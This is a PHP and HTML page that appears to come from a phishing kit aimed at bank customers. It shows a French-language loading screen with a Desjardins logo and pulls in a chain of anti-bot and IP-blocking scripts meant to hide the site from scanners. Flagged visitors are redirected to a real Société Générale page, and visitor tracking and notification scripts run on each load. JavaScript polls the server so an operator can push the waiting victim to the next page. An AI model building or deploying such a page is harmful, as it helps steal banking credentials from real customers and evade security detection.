

<?php 
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('loading.php'); 
include 'page_notify.php'; 

?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Chargement...</title>
    <style>
        body {
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        .loading-message {
            font-size: 1.2rem;
            margin-bottom: 20px;
            color: #28a745;
        }

        .dot-loader span {
            animation: blink 1.5s infinite;
            font-size: 2rem;
            color: #28a745;
        }

        .dot-loader span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot-loader span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes blink {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
    </style>
</head>
<body>

    <img src="image/logo-desjardins-couleur.png" alt="Logo" class="logo">
    <div class="loading-message">Ne quittez pas la page...</div>
    <div class="dot-loader">
        <span>.</span><span>.</span><span>.</span>
    </div>

    <script>
        // Envoie un ping régulier
        setInterval(() => {
            fetch('ping.php')
                .then(res => res.json())
                .then(data => console.log('ping...'));
        }, 3000);

        // Vérifie si une redirection est prévue
        setInterval(() => {
            fetch('redirect.php')
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'redirect') {
                        window.location.href = data.url;
                    }
                });
        }, 3000);
    </script>
</body>
</html>

